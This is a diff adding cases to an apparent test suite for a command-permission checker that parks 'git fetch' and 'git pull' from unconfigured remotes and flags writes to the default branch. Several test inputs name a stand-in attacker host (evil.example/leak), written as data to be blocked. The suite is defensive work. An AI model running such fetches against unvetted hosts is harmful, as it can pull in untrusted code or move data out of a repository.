@@ -669,11 +669,15 @@ describe('git fetch and pull only from a configured remote name', () => {
     expect(outcome('git fetch git@evil.example:leak')).toBe('park')
     expect(outcome('git pull ../other')).toBe('park')
     expect(outcome(`git fetch ${ELSEWHERE}`)).toBe('park')
+    expect(outcome('git fetch -- https://evil.example/leak')).toBe('park')
+    expect(run('git fetch -- origin HEAD:main').rule).toBe('hard:git-fetch-default-branch')
+    expect(run(`git worktree add -- ${PAD}/main`).rule).toBe('hard:git-checkout-default-branch')
   })
   it('a remote name is allowed', () => {
     expect(outcome('git fetch origin')).toBe('allow')
     expect(outcome('git fetch --depth 5 origin main')).toBe('allow')
     expect(outcome('git fetch')).toBe('allow')
+    expect(outcome('git pull origin worfy-demo/03')).toBe('allow')
   })
 })
 
